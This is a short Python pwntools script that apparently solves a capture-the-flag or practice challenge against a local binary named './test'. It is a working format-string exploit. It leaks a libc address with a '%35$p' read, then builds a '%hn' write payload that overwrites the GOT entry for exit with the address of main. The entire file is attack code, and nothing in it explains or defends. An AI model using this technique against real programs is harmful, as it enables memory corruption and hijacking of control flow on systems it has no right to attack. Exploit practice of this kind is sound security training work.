from pwn import *

#AUTH = 0x000000000040404c

def get_payload(address):
    payload = b""
    xx = address
    n = 0
    idx = 14 
    while xx > 0:
        nn = xx & 0xffff
        if nn < n:
            nn += (1<<16) 
        payload += '%{}x%{}$hn'.format(nn-n, idx).encode()
        n = xx & 0xffff 
        idx += 1
        xx >>= 16 
    return payload 

r = process('./test')
e = ELF('./test')
libc = ELF("./libc.so.6")
MAIN = e.symbols["main"]
r.sendline(b'%35$p')
r.recvuntil(b'first value:')
libc.address = int(r.recvline()[:-1],16) - libc.symbols['__libc_start_main'] - 243

log.info(f'libc address :0x{libc.address:0x}')
payload = get_payload(MAIN)
payload = payload.ljust(8 * 6, b'a')

payload += p64(e.got['exit'])+p64(e.got['exit']+2)
print(payload)
r.sendlineafter(b'tiep:', payload)
#r.sendline(payload)